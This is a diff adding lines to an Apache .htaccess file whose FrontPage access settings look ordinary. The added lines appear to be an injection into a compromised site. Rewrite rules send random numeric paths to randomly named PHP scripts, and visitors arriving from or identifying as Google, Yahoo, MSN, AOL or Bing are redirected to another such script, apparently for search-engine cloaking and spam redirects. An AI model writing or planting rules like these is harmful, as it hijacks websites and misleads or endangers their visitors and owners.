@@ -1,0 +1,30 @@
+RewriteEngine on
+RewriteRule ^7920197611/(.*)$ arraignments-asparagine.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^0827675110/(.*)$ arcades-commiserate.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ flanked-david.php?$1 [L]
+
+# -FrontPage-
+
+IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
+
+<Limit GET POST>
+order deny,allow
+deny from all
+allow from all
+</Limit>
+<Limit PUT DELETE>
+order deny,allow
+deny from all
+</Limit>
+AuthName www.taru.us
+AuthUserFile /var/chroot/home/content/a/u/t/autocrime/html/_vti_pvt/service.pwd
+AuthGroupFile /var/chroot/home/content/a/u/t/autocrime/html/_vti_pvt/service.grp
